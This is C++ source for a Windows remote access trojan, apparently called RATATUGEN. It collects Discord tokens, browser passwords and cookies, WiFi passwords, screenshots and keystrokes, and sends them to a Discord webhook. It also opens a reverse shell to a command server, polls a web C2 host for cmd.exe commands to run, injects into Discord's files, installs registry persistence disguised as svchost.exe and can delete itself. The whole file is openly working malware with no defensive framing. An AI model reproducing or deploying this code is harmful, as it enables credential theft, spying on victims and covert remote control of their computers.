void SendJsonToWebhook(const wchar_t* webhookUrl, const std::string& message) {
    std::string payload = "{\"content\":\"" + JsonEscape(message) + "\"}";
    WebhookPost(webhookUrl, L"Content-Type: application/json", payload.data(), (DWORD)payload.size());
}

// Send message + file attachments via multipart/form-data
void SendFileToWebhook(const wchar_t* webhookUrl, const std::string& message, const std::vector<std::wstring>& filePaths) {
    std::string boundary = "----RataTugenBoundary" + std::to_string(GetTickCount64());

    std::vector<unsigned char> body;
    auto Append = [&](const void* d, size_t len) {
        const unsigned char* b = (const unsigned char*)d;
        body.insert(body.end(), b, b + len);
    };

    // payload_json part (always present for message)
    std::string payloadJson = "{\"content\":\"" + JsonEscape(message) + "\"}";
    std::string p1 = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n" + payloadJson + "\r\n";
    Append(p1.data(), p1.size());

    // file parts
    for (const auto& fp : filePaths) {
        auto data = ReadFileBytes(fp);
        if (data.empty()) continue;
        size_t sep = fp.find_last_of(L"\\/");
        std::wstring fname = (sep == std::wstring::npos) ? fp : fp.substr(sep + 1);
        std::string fnameNarrow;
        for (wchar_t wc : fname) fnameNarrow += (char)wc;
        std::string mime = GetMimeType(fname);

        std::string partHeader = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"" + fnameNarrow + "\"\r\nContent-Type: " + mime + "\r\n\r\n";
        Append(partHeader.data(), partHeader.size());
        Append(data.data(), data.size());
        Append("\r\n", 2);
    }

    std::string closing = "--" + boundary + "--\r\n";
    Append(closing.data(), closing.size());

    std::wstring ct = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end());
    WebhookPost(webhookUrl, ct, body.data(), (DWORD)body.size());
}

// ==================== MAIN GRABBER ====================
void GrabAllAndSend() {
    // 1. Get tokens from LevelDB
    auto tokens = GetDiscordTokensFromLevelDB();

    // 2. Dump Discord process memory for tokens (Qvoid-style)
    auto dumpedTokens = DumpDiscordProcessTokens();
    for (auto& t : dumpedTokens) {
        if (std::find(tokens.begin(), tokens.end(), t) == tokens.end())
            tokens.push_back(t);
    }

    // 3. Enrich tokens via Discord API
    std::string output = GetSystemInfo() + "\n";
    output += "**--- DISCORD TOKENS ---**\n";

    std::set<std::string> seenIds;
    for (auto& token : tokens) {
        auto info = QueryDiscordUser(token);
        if (!info.valid) {
            // Try token format validation
            if (token.length() > 30 && token.find('.') != std::string::npos)
                output += "```Token (unvalidated): " + token + "```\n";
            continue;
        }

        // Deduplicate by user ID
        if (seenIds.count(info.id)) continue;
        seenIds.insert(info.id);

        output += "**" + info.username + "#" + info.discriminator + "**\n";
        output += "> ID: `" + info.id + "`\n";
        if (!info.email.empty()) output += "> Email: `" + info.email + "`\n";
        if (!info.phone.empty()) output += "> Phone: `" + info.phone + "`\n";
        output += "> Premium: " + std::to_string(info.premiumType) + "\n";
        output += "> Verified: " + std::string(info.verified ? "Yes" : "No") + "\n";
        output += "> Token: ||" + token + "||\n\n";

        // Save locally
        char localPath[MAX_PATH];
        snprintf(localPath, MAX_PATH, "%s\\discord_tokens.txt", getenv("TEMP"));
        std::ofstream out(localPath, std::ios::app);
        if (out) {
            out << info.username << "#" << info.discriminator << " | " << info.email << " | " << token << "\n";
            out.close();
        }
    }

    // 4. Browser passwords
    wchar_t localAppData[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    std::vector<std::pair<std::string, std::wstring>> browserPaths = {
        {"Chrome", std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default"},
        {"Brave", std::wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
        {"Edge", std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default"},
        {"Opera", std::wstring(localAppData) + L"\\Opera Software\\Opera Stable"},
    };

    std::string passOutput = "\n**--- BROWSER PASSWORDS ---**\n";
    for (auto& bp : browserPaths) {
        auto creds = StealChromePasswords(bp.second + L"\\Login Data");
        if (!creds.empty()) {
            passOutput += "**" + bp.first + ":**\n";
            for (auto& c : creds) {
                passOutput += "> " + c.url + " | " + c.username + " | " + c.password + "\n";
            }
        }
        // Cookies for Discord
        auto cookies = StealChromeCookies(bp.second + L"\\Network\\Cookies", "discord");
        if (!cookies.empty()) {
            output += "\n**--- " + bp.first + " Discord Cookies ---**\n";
            for (auto& ck : cookies) {
                output += "> " + ck.name + " = " + ck.value.substr(0, 50) + "...\n";
            }
        }
    }

    // 5. WiFi
    std::string wifi = StealWiFiPasswords();
    if (!wifi.empty()) {
        output += "\n**--- WIFI PASSWORDS ---**\n```\n" + wifi + "\n```\n";
    }
    if (!passOutput.empty() && passOutput != "\n**--- BROWSER PASSWORDS ---**\n") {
        output += passOutput;
    }

    // 6. Save to file and send
    char reportPath[MAX_PATH];
    snprintf(reportPath, MAX_PATH, "%s\\ratatugen_report.txt", getenv("TEMP"));
    std::ofstream report(reportPath);
    report << output;
    report.close();

    // Send text in chunks (Discord max is 2000 chars per message; chunk at 1800 to leave room for JSON wrapping & escaping)
    const int MAX_MSG = 1800;
    for (size_t pos = 0; pos < output.length(); ) {
        std::string chunk = output.substr(pos, MAX_MSG);
        pos += MAX_MSG;
        SendJsonToWebhook(WEBHOOK_URL, chunk);
        if (pos < output.length()) std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    // 7. Screenshot
    wchar_t ssPath[MAX_PATH];
    swprintf(ssPath, MAX_PATH, L"%s\\screenshot.jpg", _wgetenv(L"TEMP"));
    TakeScreenshot(ssPath);

    // 8. Gather keylogger log
    char keylogPath[MAX_PATH];
    snprintf(keylogPath, MAX_PATH, "%s\\syslog.dat", getenv("APPDATA"));
    std::wstring wKeylogPath(keylogPath, keylogPath + strlen(keylogPath));

    // Send screenshot + keylogger log as file attachments to the webhook
    SendFileToWebhook(WEBHOOK_URL, "Screenshot + Keylogger logs", { ssPath, wKeylogPath });

    // 9. Discord injection (write index.js to Discord cores - simplified version)
    wchar_t appdata[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
    std::wstring localApp(appdata);
    // Find and inject into Discord core directories
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(localApp + L"\\discord")) {
            if (entry.path().filename() == "core.asar") {
                std::wstring coreDir = entry.path().parent_path().wstring();
                std::wstring indexPath = coreDir + L"\\index.js";
                if (!std::filesystem::exists(indexPath)) {
                    std::ofstream idx(indexPath);
                    idx << "module.exports = require('./core.asar');";
                    idx.close();
                }
            }
        }
    } catch(...) {}
}

// ==================== REVERSE SHELL ====================
void ReverseShell() {
    while (true) {
        SOCKET sock = INVALID_SOCKET; WSADATA wsaData;
        while (sock == INVALID_SOCKET || sock == SOCKET_ERROR) {
            WSAStartup(MAKEWORD(2,2), &wsaData); sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(C2_PORT); inet_pton(AF_INET, C2_HOST, &addr.sin_addr);
            if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                closesocket(sock); sock = INVALID_SOCKET; WSACleanup();
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
        send(sock, "Connected\n", 10, 0);
        while (true) {
            char cmdBuf[4096]={0}; int recvd = recv(sock, cmdBuf, 4096, 0); if (recvd <= 0) break;
            std::string cmd(cmdBuf, recvd);
            while(!cmd.empty()&&(cmd.back()=='\n'||cmd.back()=='\r')) cmd.pop_back();
            if (cmd=="exit"){closesocket(sock);WSACleanup();ExitProcess(0);}
            if (cmd=="persist"){InstallPersistence();send(sock,"[+] Persistence installed\n",27,0);continue;}
            if (cmd=="grab") {GrabAllAndSend(); send(sock,"[+] Grab executed\n",18,0); continue;}
            cmd = "cmd.exe /c " + cmd + " 2>&1";
            HANDLE hR, hW; SECURITY_ATTRIBUTES sa={sizeof(SECURITY_ATTRIBUTES),NULL,TRUE};
            CreatePipe(&hR,&hW,&sa,0); SetHandleInformation(hR,HANDLE_FLAG_INHERIT,0);
            STARTUPINFOA si={sizeof(STARTUPINFOA)}; PROCESS_INFORMATION pi;
            si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE; si.hStdOutput=hW; si.hStdError=hW;
            char cmdLine[8192]; snprintf(cmdLine,sizeof(cmdLine),"%s",cmd.c_str());
            if(CreateProcessA(NULL,cmdLine,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
                CloseHandle(hW); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                WaitForSingleObject(pi.hProcess,10000);
                char buf[4096]; DWORD br; std::string out;
                while(ReadFile(hR,buf,sizeof(buf)-1,&br,NULL)&&br>0){buf[br]=0;out+=buf;}
                CloseHandle(hR); if(out.empty()) out="[+] Command executed"; out+="\n";
                send(sock,out.c_str(),(int)out.size(),0);
            }else{CloseHandle(hW);CloseHandle(hR);send(sock,"[-] Failed\n",10,0);}
        }
        closesocket(sock); WSACleanup();
    }
}

// ==================== WEB C2 CLIENT ====================
// Deploy c2_server.py to Render.com → paste URL here
const wchar_t* C2_SERVER_URL = L"https://ratatugen-c2.onrender.com";

// Forward declarations
void UninstallRAT();

// Send HTTP POST with JSON payload, returns response body
std::string C2HttpPost(const std::wstring& url, const std::string& jsonBody) {
    HINTERNET hSession = WinHttpOpen(L"RATATUGEN/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";
    URL_COMPONENTS uc = {sizeof(URL_COMPONENTS)};
    wchar_t host[256]={0}, path[1024]={0};
    uc.lpszHostName=host; uc.dwHostNameLength=256;
    uc.lpszUrlPath=path; uc.dwUrlPathLength=1024;
    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &uc)) { WinHttpCloseHandle(hSession); return ""; }
    HINTERNET hConn = WinHttpConnect(hSession, uc.lpszHostName, uc.nPort, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return ""; }
    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", uc.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return ""; }
    std::wstring hdrs = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(hReq, hdrs.c_str(), (DWORD)hdrs.length(), (LPVOID)jsonBody.c_str(), (DWORD)jsonBody.length(), (DWORD)jsonBody.length(), 0);
    WinHttpReceiveResponse(hReq, NULL);
    std::string resp; DWORD br; char buf[4096];
    while (WinHttpReadData(hReq, buf, sizeof(buf)-1, &br) && br > 0) { buf[br]=0; resp+=buf; }
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession);
    return resp;
}

// Web C2 polling loop
void WebC2PollLoop() {
    std::this_thread::sleep_for(std::chrono::seconds(2));

    // Precompute client ID once
    char selfName[256]; DWORD sz = 256;
    GetComputerNameA(selfName, &sz);
    char userName[256]; sz = 256;
    GetUserNameA(userName, &sz);
    std::string myId = "RAT-" + std::string(selfName);
    std::wstring regUrl = std::wstring(C2_SERVER_URL) + L"/register";
    std::wstring pollUrl = std::wstring(C2_SERVER_URL) + L"/poll";
    std::wstring resultUrl = std::wstring(C2_SERVER_URL) + L"/result";
    int loopCount = 0;

    // Announce to C2 server
    std::string regBody = "{\"id\":\"" + myId + "\",\"pc\":\"" + selfName + "\",\"user\":\"" + userName + "\"}";
    C2HttpPost(regUrl, regBody);

    while (true) {
        try {
            // Re-register every 25 seconds (heartbeat)
            loopCount++;
            if (loopCount % 5 == 0) {
                C2HttpPost(regUrl, "{\"id\":\"" + myId + "\",\"pc\":\"" + selfName + "\",\"user\":\"" + userName + "\"}");
            }

            // Poll for commands
            std::string pollBody = "{\"id\":\"" + myId + "\"}";
            std::string resp = C2HttpPost(pollUrl, pollBody);

            // Parse {"command":"..."} safely
            std::string command;
            size_t cmdKey = resp.find("\"command\"");
            if (cmdKey != std::string::npos) {
                size_t colon = resp.find(':', cmdKey + 9);
                if (colon != std::string::npos) {
                    size_t q1 = resp.find('"', colon + 1);
                    if (q1 != std::string::npos) {
                        size_t q2 = resp.find('"', q1 + 1);
                        if (q2 != std::string::npos && q2 > q1 + 1) {
                            command = resp.substr(q1 + 1, q2 - q1 - 1);
                        } else {
                            // empty command — skip
                            command = "";
                        }
                    }
                }
            }
            // Safety: reject commands that are just single characters or garbage
            if (command.length() <= 1) command = "";

            if (!command.empty()) {
                std::string result;
                if (command == "GRAB_ALL") {
                    GrabAllAndSend();
                    result = "GRAB_ALL completed -- check webhook";
                } else if (command == "SCREENSHOT") {
                    // Take screenshot and report path
                    wchar_t ssPath[MAX_PATH];
                    swprintf(ssPath, MAX_PATH, L"%s\\c2_screenshot.jpg", _wgetenv(L"TEMP"));
                    TakeScreenshot(ssPath);
                    result = "Screenshot saved to %TEMP%\\c2_screenshot.jpg";
                } else if (command == "KEYLOG_DUMP") {
                    // Read keylogger log
                    char keylogPath[MAX_PATH];
                    snprintf(keylogPath, MAX_PATH, "%s\\syslog.dat", getenv("APPDATA"));
                    std::ifstream kf(keylogPath, std::ios::binary);
                    if (kf) {
                        std::string kl((std::istreambuf_iterator<char>(kf)), std::istreambuf_iterator<char>());
                        kf.close();
                        if (kl.empty()) result = "Keylog is empty";
                        else { result = "KEYLOG:\n" + kl; if (result.length() > 3000) result = result.substr(0, 3000) + "\n... (truncated)"; }
                    } else {
                        result = "No keylog file found";
                    }
                } else if (command == "UNINSTALL") {
                    std::string byeBody = "{\"id\":\"RAT-" + std::string(selfName) + "\",\"command\":\"UNINSTALL\",\"output\":\"Uninstalling...\"}";
                    C2HttpPost(std::wstring(C2_SERVER_URL) + L"/result", byeBody);
                    UninstallRAT();
                } else {
                    // Run via cmd.exe
                    std::string fullCmd = "cmd.exe /c " + command + " 2>&1";
                    HANDLE hR, hW;
                    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
                    CreatePipe(&hR, &hW, &sa, 0);
                    SetHandleInformation(hR, HANDLE_FLAG_INHERIT, 0);
                    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
                    PROCESS_INFORMATION pi;
                    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                    si.wShowWindow = SW_HIDE;
                    si.hStdOutput = hW; si.hStdError = hW;
                    char cmdLine[8192];
                    snprintf(cmdLine, sizeof(cmdLine), "%s", fullCmd.c_str());
                    if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                        CloseHandle(hW); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                        WaitForSingleObject(pi.hProcess, 30000);
                        char buf[4096]; DWORD br;
                        while (ReadFile(hR, buf, sizeof(buf)-1, &br, NULL) && br > 0) { buf[br]=0; result+=buf; }
                        CloseHandle(hR);
                        if (result.empty()) result = "[OK] No output";
                    } else { CloseHandle(hW); CloseHandle(hR); result = "[ERROR] Failed"; }
                }

                // Send result back to C2 panel
                std::string escapedResult = result;
                for (size_t p=0; (p=escapedResult.find('\\',p))!=std::string::npos; p+=2) escapedResult.replace(p,1,"\\\\");
                for (size_t p=0; (p=escapedResult.find('"',p))!=std::string::npos; p+=2) escapedResult.replace(p,1,"\\\"");
                for (size_t p=0; (p=escapedResult.find('\n',p))!=std::string::npos; p+=2) escapedResult.replace(p,1,"\\n");
                if (escapedResult.length() > 3000) escapedResult = escapedResult.substr(0, 3000);

                std::string resBody = "{\"id\":\"" + myId + "\",\"command\":\"" + command + "\",\"output\":\"" + escapedResult + "\"}";
                C2HttpPost(resultUrl, resBody);

                // Also log command output to Discord webhook
                if (command != "GRAB_ALL") {
                    std::string whMsg = "[" + myId + "] Command: `" + command + "`\n```\n" + result.substr(0, 1800) + "\n```";
                    SendJsonToWebhook(WEBHOOK_URL, "**C2 COMMAND OUTPUT**\n" + whMsg);
                }
            }
        } catch (...) {}
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

// ==================== SELF-DESTRUCT ====================
void UninstallRAT() {
    // Remove persistence
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegDeleteValueA(hKey, "WindowsService");
    RegCloseKey(hKey);

    // Delete persistent copy
    char destPath[MAX_PATH];
    snprintf(destPath, MAX_PATH, "%s\\svchost.exe", getenv("APPDATA"));
    DeleteFileA(destPath);

    // Delete current executable via bat script (unlock + delete on reboot)
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    char batPath[MAX_PATH];
    snprintf(batPath, MAX_PATH, "%s\\cleanup.bat", getenv("TEMP"));
    std::ofstream bat(batPath);
    bat << "@echo off\r\n";
    bat << ":loop\r\n";
    bat << "del /f \"" << selfPath << "\" 2>nul\r\n";
    bat << "if exist \"" << selfPath << "\" goto loop\r\n";
    bat << "del /f \"%~f0\"\r\n";
    bat.close();

    // Run cleanup bat hidden
    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, (LPSTR)batPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    ExitProcess(0);
}

// ==================== KEYLOGGER ====================
HHOOK kbHook = NULL; FILE* logFile = NULL;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        if (!logFile) { char p[MAX_PATH]; snprintf(p,MAX_PATH,"%s\\syslog.dat",getenv("APPDATA")); logFile=fopen(p,"a"); }
        BYTE ks[256]={0}; GetKeyboardState(ks); WORD ch; ToAscii(kb->vkCode,kb->scanCode,ks,&ch,0);
        if(logFile){if(ch>=32&&ch<=126)fputc((char)ch,logFile);else fprintf(logFile," [%d] ",kb->vkCode);fflush(logFile);}
    }
    return CallNextHookEx(kbHook,nCode,wParam,lParam);
}
void StartKeylogger() { kbHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleA(NULL), 0); MSG msg; while(GetMessage(&msg,NULL,0,0)){TranslateMessage(&msg);DispatchMessage(&msg);} }

// ==================== ENTRY ====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Mutex to prevent double-run
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "RATATUGEN_SINGLE_INSTANCE");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0; // Already running, silently exit
    }

    InstallPersistence();

    std::thread keylogThread(StartKeylogger);
    keylogThread.detach();

    std::thread grabThread([](){
        std::this_thread::sleep_for(std::chrono::seconds(3)); // Wait for Discord to start
        GrabAllAndSend();
    });
    grabThread.detach();

    // Web C2 polling thread
    std::thread c2Thread(WebC2PollLoop);
    c2Thread.detach();

    HideConsole();
    ReverseShell();
    return 0;
}